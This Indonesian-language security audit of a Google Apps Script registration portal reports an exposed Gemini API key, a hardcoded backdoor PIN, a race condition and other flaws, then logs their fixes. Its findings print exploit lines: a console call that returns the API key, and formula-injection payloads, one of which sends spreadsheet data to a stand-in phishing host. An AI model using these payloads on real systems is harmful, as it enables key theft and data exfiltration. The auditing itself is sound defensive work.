# 🛡️ DOKUMEN EVALUASI & AUDIT SISTEM APLIKASI PENDAFTARAN PESERTA
**Platform:** Portal Multi-Kegiatan Pendaftaran Peserta Bidang SMP DISDIKBUD Kab. Karanganyar  
**Arsitektur:** Google Apps Script (Backend) + HTML5/Bootstrap 5 (Frontend GAS) + GitHub Pages (Wrapper/Proxy)  
**Status Audit:** Audit Keamanan, Konkurensi, Integritas Data, dan Kepatuhan Privasi (Metode: `/grill-me`)  
**Peringatan:** *Dokumen ini murni laporan evaluasi independen. Sesuai instruksi, tidak ada baris kode aplikasi yang diubah.*

---

## 📑 DAFTAR ISI
1. [Ringkasan Eksekutif (Executive Summary)](#1-ringkasan-eksekutif)
2. [Temuan Celah Keamanan Fatal (🔴 Tingkat Kritis)](#2-celah-keamanan-fatal-tingkat-kritis)
3. [Temuan Concurrency & Bug Logika (🟠 Tingkat Tinggi)](#3-bug-konkurensi--integritas-data-tingkat-tinggi)
4. [Kepatuhan Privasi & AI Integration (🟡 Tingkat Sedang)](#4-privasi-data--integrasi-ai-tingkat-sedang)
5. [Celah Validasi Backend & Edge Cases (🟡 Tingkat Sedang)](#5-celah-validasi-backend--edge-cases)
6. [Daftar Pertanyaan Kritis Uji Keputusan Desain (The Grill-Me Interview)](#6-daftar-pertanyaan-kritis-uji-keputusan-desain)

---

## 1. Ringkasan Eksekutif

Setelah melakukan penelusuran mendalam terhadap seluruh berkas sistem:
- `Code.gs` (1.210 baris kode backend GAS)
- `index.html` (4.135 baris kode frontend formulir & dashboard)
- `github_index.html` (337 baris kode splash screen & pembungkus iframe)

Ditemukan **4 kerentanan keamanan kritis**, **2 race condition konkurensi data**, **1 isu kepatuhan privasi (UU PDP)**, serta **sejumlah kelemahan validasi sisi server (backend)**. Jika aplikasi ini dirilis ke ratusan sekolah di Kabupaten Karanganyar tanpa perbaikan, sistem rentan terhadap pembobolan hak akses panitia, kebocoran kunci API Gemini, manipulasi data kuota sekolah, serta eksekusi formula jahat di komputer dinas panitia.

---

## 2. Celah Keamanan Fatal (🔴 Tingkat Kritis)

### 🔴 Temuan 2.1: Kebocoran Kunci Rahasia Gemini API via Public RPC Endpoint
- **Lokasi Kode:** `Code.gs` baris 978–999 (`function getGeminiApiKey()`) dan baris 1120–1165 (`function callGeminiAPI()`)
- **Mekanisme Celah:**
  Di Google Apps Script Web App, semua fungsi global yang dideklarasikan **tanpa akhiran garis bawah (`_`)** secara otomatis diekspos sebagai API publik yang dapat dipanggil langsung dari konsol browser client melalui objek `google.script.run`.
- **Skenario Eksploitasi:**
  Siapa pun (termasuk peserta umum atau pihak luar) cukup membuka halaman pendaftaran, menekan `F12` (Developer Tools) -> tab **Console**, lalu mengetik:
  ```javascript
  google.script.run.withSuccessHandler(key => console.log("KUNCI GEMINI BOCOR:", key)).getGeminiApiKey();
  ```
  Fungsi akan mengembalikan `GEMINI_API_KEY` milik dinas secara terang-terangan tanpa memerlukan login atau PIN panitia sama sekali.
- **Dampak:** Kunci API dapat dicuri dan disalahgunakan pihak ketiga untuk keperluan pribadi hingga kuota habis atau tagihan membengkak.

---

### 🔴 Temuan 2.2: Universal Backdoor PIN Panitia (`123456`) Tertanam Permanen
- **Lokasi Kode:** 
  - `Code.gs` baris 27, 308, 338 (`verifyAdminPin`)
  - `index.html` baris 2780–2786, 2822, 2837
- **Mekanisme Celah:**
  Pada backend `Code.gs`:
  ```javascript
  function verifyAdminPin(pin) {
    if (!pin) return false;
    const inputPin = String(pin).trim();
    if (inputPin === DEFAULT_ADMIN_PIN) return true; // DEFAULT_ADMIN_PIN = "123456"
    // ...
    return inputPin === DEFAULT_ADMIN_PIN;
  }
  ```
  Pada frontend `index.html`:
  ```javascript
  if (pin === "123456") {
    currentAdminPin = "123456";
    closeModalPinPanitia();
    togglePanitiaView(true);
    loadDashboardData();
    return;
  }
  ```
- **Skenario Eksploitasi:**
  Meskipun panitia telah mengubah PIN di sheet `Login_Panitia` atau di sheet `Config` menjadi kombinasi rahasia rumit, siapa pun yang memasukkan angka `123456` akan **langsung lolos** verifikasi frontend maupun backend.
- **Dampak:** Backdoor permanen yang membuat sistem otentikasi panitia tidak memiliki arti keamanan (*security theater*).

---

### 🔴 Temuan 2.3: Potensi Kebocoran PIN Panitia di Source Code HTML Publik
- **Lokasi Kode:** `Code.gs` baris 224, 243–260 dan `index.html` baris 1609
- **Mekanisme Celah:**
  Fungsi `getAppSettings()` mengambil **seluruh baris** dari sheet `Config` tanpa filter:
  ```javascript
  const template = HtmlService.createTemplateFromFile("index");
  template.serverSettings = getAppSettings(); // Mengambil seluruh key-value di sheet Config
  ```
  Kemudian di `index.html`:
  ```html
  <script id="serverSettingsData" type="application/json"><?!= JSON.stringify(serverSettings) ?></script>
  ```
  Jika admin menyimpan `ADMIN_PIN` atau konfigurasi kredensial apa pun di sheet `Config` (yang didukung oleh baris 328 `Code.gs`), nilai tersebut akan dicetak mentah-mentah ke dalam DOM HTML halaman publik.
- **Skenario Eksploitasi:**
  Peserta cukup melakukan klik kanan -> **View Page Source**, mencari tag `serverSettingsData`, dan melihat PIN panitia secara teks terbuka (*plaintext*).

---

### 🔴 Temuan 2.4: Kerentanan CSV & Spreadsheet Formula Injection (CWE-1236)
- **Lokasi Kode:** 
  - `Code.gs` baris 591–614 (`sheet.appendRow(newRow)`)
  - `index.html` baris 3500–3521 (`exportParticipantsToCSV`)
- **Mekanisme Celah:**
  Kolom data input seperti `namaLengkap`, `jabatan`, `riwayatPenyakit`, dan `kontakDaruratNama` langsung dimasukkan ke sheet dan diekspor ke CSV tanpa pembersihan karakter awal pemicu formula: `=`, `+`, `-`, atau `@`.
- **Skenario Eksploitasi:**
  Seorang pendaftar iseng atau berniat jahat mengisi formulir pendaftaran:
  - Nama Lengkap: `=cmd|'/C calc'!A0`
  - atau: `=HYPERLINK("http://situs-phishing.com/curi-data?d=" & B2; "KLIK DISINI")`
- **Dampak:**
  Saat panitia Disdikbud mengunduh berkas `.csv` atau membuka Google Sheets di Microsoft Excel, formula tersebut akan dieksekusi oleh Excel, berpotensi memicu *Remote Code Execution* (RCE) atau kebocoran data di komputer dinas panitia.

---

## 3. Bug Konkurensi & Integritas Data (🟠 Tingkat Tinggi)

### 🟠 Temuan 3.1: TOCTOU Race Condition pada Pembatasan Kuota Sekolah
- **Lokasi Kode:** `Code.gs` baris 520–535 vs baris 577–578
- **Mekanisme Bug:**
  Alur fungsi `submitRegistration()` saat ini:
  1. Baris 520: Pengecekan kuota sekolah (`existing.count >= maxKuota`) dilakukan **di luar kunci pengaman**.
  2. Baris 539–574: Sanitasi data NIP, nomor WA, modul dinamis.
  3. Baris 577–578: `LockService.getScriptLock()` baru dipanggil dan dikunci!
  4. Baris 591–614: Menulis baris baru ke sheet **tanpa mengecek ulang kuota**.
- **Skenario Masalah (High Concurrency):**
  Misal kuota SMP N 1 adalah 1 orang. Dua guru (Guru A dan Guru B) membuka form dan menekan tombol "Kirim Pendaftaran" secara bersamaan di detik yang sama.
  1. Thread A memeriksa kuota: SMP N 1 masih terdaftar 0. Lolos.
  2. Thread B memeriksa kuota di milidetik yang sama: SMP N 1 masih terdaftar 0. Lolos.
  3. Thread A mengambil Lock, menulis data Guru A, melepas Lock.
  4. Thread B mengambil Lock, **langsung menulis data Guru B tanpa validasi ulang kuota**, melepas Lock.
- **Dampak:** SMP N 1 terdaftar 2 orang, melanggar batas kuota dinas. Pengecekan kuota jebol saat jam sibuk (*peak traffic*).

---

### 🟠 Temuan 3.2: Risiko Tabrakan (Collision) ID Registrasi & Kegagalan Hapus Data
- **Lokasi Kode:** `Code.gs` baris 589 dan baris 838–851
- **Mekanisme Bug:**
  Format ID Registrasi dibentuk dari:
  ```javascript
  const regId = "REG-" + yyMMdd + "-" + Math.floor(1000 + Math.random() * 9000);
  ```
  Angka acak hanya berupa 4 digit (1.000 s.d. 9.999 = 9.000 kemungkinan unik per hari).
  Berdasarkan *Birthday Paradox*, probabilitas terjadinya duplikasi ID mulai melonjak signifikan setelah hanya puluhan pendaftaran pada hari yang sama.
  Tidak ada mekanisme verifikasi keunikan (`isRegIdExist()`) sebelum baris disimpan.
- **Dampak Turunan:**
  Pada fungsi `deleteParticipant(regId, pin)`:
  ```javascript
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][1]).trim() === cleanRegId) {
      deletedRow = i + 1;
      break; // HANYA MENGHAPUS ROW PERTAMA YANG KETEMU
    }
  }
  ```
  Jika terjadi ID ganda, panitia yang bermaksud menghapus Peserta B bisa salah menghapus data Peserta A!

---

## 4. Privasi Data & Integrasi AI (🟡 Tingkat Sedang)

### 🟡 Temuan 4.1: Pengiriman Data Sensitif Pribadi (PII & Rekam Medis) ke Pihak Ketiga (LLM)
- **Lokasi Kode:** `Code.gs` baris 1045–1062 (`askGeminiAboutActiveEvent`)
- **Mekanisme Celah:**
  Saat asisten AI dipanggil oleh panitia, sistem menyusun JSON seluruh peserta yang berisi:
  - NIP lengkap
  - Nomor WhatsApp aktif
  - Riwayat penyakit / catatan medis (`riwayatPenyakit`)
  - Nama & nomor telepon kontak darurat
  Seluruh data mentah ini dikirimkan via HTTP POST ke endpoint publik Google Gemini (`generativelanguage.googleapis.com`).
- **Analisis Kepatuhan Hukum:**
  Berdasarkan **UU No. 27 Tahun 2022 tentang Pelindungan Data Pribadi (UU PDP)** di Indonesia:
  - Data kesehatan/riwayat medis dikategorikan sebagai **Data Pribadi Spesifik** (Pasal 4 ayat 2 huruf a).
  - Pengiriman data pribadi spesifik dan nomor telepon dinas ke platform pemrosesan AI eksternal tanpa penyamaran (*data masking/hashing*) atau persetujuan (*consent*) subjek data berisiko terhadap kepatuhan tata kelola data pemerintahan.

---

### 🟡 Temuan 4.2: Payload Bloating & Potensi Timeout Eksekusi GAS
- **Lokasi Kode:** `Code.gs` baris 1045–1105
- **Mekanisme Isu:**
  Jika suatu kegiatan diikuti oleh 300 s.d. 500 peserta (seluruh guru SMP se-kabupaten), objek `contextData` yang dikirim ke Gemini akan berukuran puluhan hingga ratusan kilobyte teks JSON.
  `google.script.run` di frontend memiliki batas waktu tunggu (*client-side timeout*). Permintaan prompt yang sangat besar dan membutuhkan inferensi lama berisiko menyebabkan pesan *"Script function timed out"* di dashboard panitia.

---

## 5. Celah Validasi Backend & Edge Cases (🟡 Tingkat Sedang)

### 🟡 Temuan 5.1: Ketiadaan Validasi Field Wajib di Sisi Server (Backend)
- **Lokasi Kode:** `Code.gs` baris 538–575
- **Mekanisme Celah:**
  Validasi form hampir 100% bergantung pada JavaScript browser di `index.html`.
  Di backend `submitRegistration()`, sistem **hanya** memvalidasi:
  - Status formulir buka/tutup
  - Kuota sekolah
  - Panjang digit NIP jika PNS/PPPK
  - Panjang digit nomor WhatsApp
  Sistem **TIDAK** memvalidasi apakah `namaLengkap`, `namaSekolah`, `jabatan`, atau `kecamatan` kosong (`undefined`/`""`).
- **Skenario Eksploitasi:**
  Jika ada pengguna mengirim request langsung via DevTools / script luar:
  `google.script.run.submitRegistration({ namaLengkap: "", namaSekolah: "" })`
  Maka baris kosong bertanda `"-"` akan tetap berhasil disimpan ke database Google Sheets.

---

### 🟡 Temuan 5.2: Pembuatan Sheet Arsip Kosong Saat Reset Berturut-turut
- **Lokasi Kode:** `Code.gs` baris 922–927 (`archiveAndResetEvent`)
- **Mekanisme Bug:**
  Jika admin menekan tombol "Reset & Arsip" saat sheet `Data_Peserta` masih kosong (misal setelah kegiatan direset pertama kali lalu tidak sengaja tertekan lagi), kode tetap membuat sheet arsip baru:
  `Arsip_KEGIATAN BIDANG SMP`, `Arsip_KEGIATAN BIDANG SMP_v2`, dst., yang isinya hanya 1 baris header kosong.
- **Dampak:** Google Spreadsheet menjadi berantakan dengan puluhan tab arsip kosong yang tidak berguna.

---

## 6. Daftar Pertanyaan Kritis Uji Keputusan Desain (The Grill-Me Interview)

Berdasarkan temuan di atas, berikut adalah 7 pertanyaan mendasar yang harus dijawab dan diputuskan oleh Tim Pengembang / Pemilik Proyek sebelum aplikasi ini digunakan dalam produksi:

### ❓ Pertanyaan 1 (Autentikasi & Backdoor)
> **"Mengapa `123456` dibiarkan hardcoded di frontend dan backend, serta mengapa verifikasi di bypass instan di browser? Apakah sistem ini memang direncanakan memiliki akun Master darurat, ataukah ini sisa kode saat masa pengembangan (*development leftover*) yang lupa dibersihkan?"**

---

### ❓ Pertanyaan 2 (Perlindungan Kunci API)
> **"Apakah Anda menyadari bahwa fungsi `getGeminiApiKey()` dan `callGeminiAPI()` dapat dipanggil oleh siapa saja dari browser publik tanpa login? Bersediakah Anda memindahkan fungsi-fungsi pembantu ini menjadi fungsi internal bertanda underscore (`_`) agar tidak dapat dieksekusi dari luar?"**

---

### ❓ Pertanyaan 3 (Pencegahan Jebol Kuota)
> **"Pada jam-jam pembukaan pendaftaran biasanya seluruh perwakilan sekolah mendaftar secara serentak. Mengapa `LockService` baru dipanggil di baris 578 setelah pengecekan kuota selesai di baris 520? Apakah Anda siap memindahkan perolehan `LockService` ke awal fungsi `submitRegistration()` agar tidak terjadi pendaftar ganda dari sekolah yang sama?"**

---

### ❓ Pertanyaan 4 (Format ID Registrasi)
> **"Dengan formula `REG-yyMMdd-XXXX` (hanya 4 digit acak), peluang tabrakan ID sangat tinggi jika pendaftar mencapai ratusan orang dalam satu hari. Apakah format ID ingin diubah menjadi urutan otomatis (sekuensial: `REG-261106-0001`, `0002`, dst.) atau menggunakan string hash unik (misal: 6 karakter alfanumerik acak) plus pengecekan duplikasi di database?"**

---

### ❓ Pertanyaan 5 (Privasi Data Kesehatan & NIP di AI)
> **"Apakah asisten AI panitia benar-benar membutuhkan nomor HP pribadi, NIP, dan riwayat penyakit setiap peserta saat menjawab pertanyaan statistik? Mengapa data sensitif tersebut tidak disamarkan (*masked* / dihilangkan dari prompt AI) sehingga hanya data agregat dan nama saja yang dikirim ke Google Gemini?"**

---

### ❓ Pertanyaan 6 (Keamanan Formula Excel / CSV)
> **"Panitia tentu akan sering mengekspor data ke Excel. Apakah Anda menyetujui penambahan sanitasi otomatis di backend dan frontend agar setiap data teks yang diawali karakter `=`, `+`, `-`, atau `@` otomatis diberi petik tunggal (`'`) demi mencegah formula injection di komputer panitia?"**

---

### ❓ Pertanyaan 7 (Ketahanan Reset Database)
> **"Bagaimana jika tombol reset ditekan ketika belum ada peserta yang terdaftar? Apakah sistem sebaiknya menolak proses arsip jika baris data masih kosong daripada membuat tab arsip sampah berturut-turut?"**

---

*Laporan evaluasi ini telah selesai disusun secara netral, obyektif, dan komprehensif tanpa mengubah sebaris kode pun pada sistem.*


---

## 7. Log Resolusi & Status Perbaikan (Post-Audit Implementation)

Seluruh temuan kritis yang telah disetujui untuk diperbaiki telah berhasil diimplementasikan dan diverifikasi:

| No | Temuan / Area | Status Resolusi | Tindakan yang Diambil |
|:---|:---|:---:|:---|
| 1 | Universal Backdoor `123456` | ✅ **RESOLVED** | Dihapus tuntas di [`Code.gs`](file:///home/bayusigit/Project%20JP/Aplikasi%20Daftar%20Peserta/Code.gs) & [`index.html`](file:///home/bayusigit/Project%20JP/Aplikasi%20Daftar%20Peserta/index.html). Hanya PIN valid di sheet `Login_Panitia` yang berlaku. |
| 2 | Kunci API Gemini Bocor | ✅ **RESOLVED** | Diubah menjadi fungsi internal privat bertanda `_` (`getGeminiApiKey_()` & `callGeminiAPI_()`), sehingga tidak terekspos ke RPC client browser. |
| 3 | Kredensial Bocor di HTML DOM | ✅ **RESOLVED** | `getAppSettings()` menyaring kunci sensitif (`ADMIN_PIN`, `GEMINI_API_KEY`, `PASSWORD`, `SECRET`) agar tidak pernah dikirim ke kode HTML publik. |
| 4 | TOCTOU Race Condition Kuota | ✅ **RESOLVED** | `LockService.getScriptLock()` dinaikkan ke awal proses pendaftaran sebelum pengecekan kuota sekolah dilakukan. |
| 5 | Risiko Tabrakan ID Registrasi | ✅ **RESOLVED** | Diperbarui menjadi `REG-yyMMdd-XXXXX` menggunakan 5 karakter alfanumerik acak non-ambigu (>60 juta kombinasi unik/hari) dengan verifikasi keunikan sebelum disimpan. |
| 6 | Formula Injection (CSV & Sheets) | ✅ **RESOLVED** | Setiap input teks yang diawali karakter formula (`=`, `+`, `-`, `@`) disanitasi dengan petik tunggal (`'`) di backend dan generator CSV. |
| 7 | Validasi Wajib Sisi Server | ✅ **RESOLVED** | Backend kini memvalidasi `namaLengkap`, `namaSekolah`, dan `statusKepegawaian` wajib diisi, mencegah baris kosong/bypass DevTools. |
| 8 | Sheet Arsip Sampah | ✅ **RESOLVED** | `archiveAndResetEvent()` memeriksa jumlah baris data peserta. Jika kosong (`lastRow <= 1`), proses dibatalkan dengan pesan informatif. |
| 9 | Log Aktivitas Panitia | ✅ **RESOLVED** | Kolom "Terakhir Login" pada sheet `Login_Panitia` otomatis diperbarui setiap kali panitia berhasil login. |


---

## 8. Modul Baru: Menu SPJ & Doc (Google Drive + Dynamic Template Generator)

Fitur **SPJ & Doc** telah selesai disempurnakan berdasarkan hasil wawancara keputusan desain `/grill-me`:
- **Lokasi Menu:** Tab ke-3 mandiri di Dashboard Panitia bernama **`SPJ & Doc`**.
- **Alur Pengguna (Two-Stage UX):**
  1. **Lihat Dokumen:** Membuka lembar pratinjau format resmi dinas (A4 Landscape) lengkap dengan struktur kolom standar dinas dan tanda tangan format 3 pejabat.
  2. **Buat Dokumen:** Membuka panel pengisian parameter anggaran & pemrosesan data riil pendaftar kegiatan aktif.
- **Integrasi Google Drive:** Terhubung langsung ke folder resmi Bidang SMP (`1Rhc_GVXNtFA8wPzkgerLCztrXQeML037`).
- **Format File:** Terkunci ketat hanya menerima **`.xlsx`** dan **`.docx`**.
- **Filter & Seleksi Peserta Fleksibel:** Filter per **Kecamatan** (17 kecamatan di Karanganyar), per **Status Kepegawaian** (PNS, PPPK, Non-ASN), serta checkbox seleksi per baris dengan counter otomatis (*"X dari Y Terpilih"*).
- **Aturan Pajak PPh 21 (Standar APBD + Override):**
  - Sakelar toggle global *"Terapkan Pemotongan PPh 21"* (ON/OFF).
  - Standar tarif otomatis: Gol IV (15%), Gol III (5%), Gol I-II / PPPK / Non-ASN (0%).
  - Dukungan override tarif manual (0%, 5%, 15%) per baris peserta.
- **Pola Tanda Tangan Zig-Zag Dinas:** Format zig-zag ganjil rata kiri (`1. .........`) dan genap bergeser ke kanan (`2. .........`) pada pratinjau, cetak PDF, maupun ekspor Excel dan Word.
- **Dukungan Ekspor Lengkap:**
  - Unduh **Excel (.XLSX)** dengan SheetJS lengkap dengan border, header dinas, dan tanda tangan 3 pejabat di lembar penutup.
  - Unduh **Word (.DOCX)** berbasis dokumen tabel dinas resmi.
  - Cetak **PDF/Print** berkelanjutan (header tabel berulang di tiap halaman, tanda tangan berada di akhir).
